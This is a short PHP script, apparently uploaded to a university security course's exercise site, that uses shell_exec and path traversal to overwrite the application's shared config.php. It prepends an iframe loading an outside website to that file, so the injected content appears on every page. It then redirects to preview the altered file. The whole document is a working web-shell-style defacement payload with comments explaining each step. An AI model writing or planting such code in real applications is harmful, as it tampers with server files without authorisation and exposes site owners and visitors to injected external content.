<?php 
   // This script is used to copy the selected string to the top of a selected file
   // This is done by copying the string to a temp-file concatenating the target file to the temp-file
   // Finally the combined file is copied to the target
   // In this example we are adding an iframe with a funny video to the config.php, used by every part of the application

   // Remove the temp file, if it exists
   shell_exec("rm ./newfile.txt");   

   // Create the string and write to a file
   $string = '<iframe src="https://hemansings.com/?autoplay=1&mute=1" allow="autoplay=true" width="1620" height="850" ></iframe> 
      ';
   $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
   fwrite($myfile, $string);

   // Read the target file and write to the bottom of the temp-file using cat
   shell_exec("cat ../../../../config/config.php >> ./newfile.txt");   

   // Copy the combined file to the target to replace it
   copy('./newfile.txt', '../../../../config/config.php');
  
   // Open the temp-file, to preview the result of the concatenation
   header("Location: http://youshallnothack.csec.chatzi.org/courses/TMA102/work/6276e7d1e013b/newfile.txt");
?>
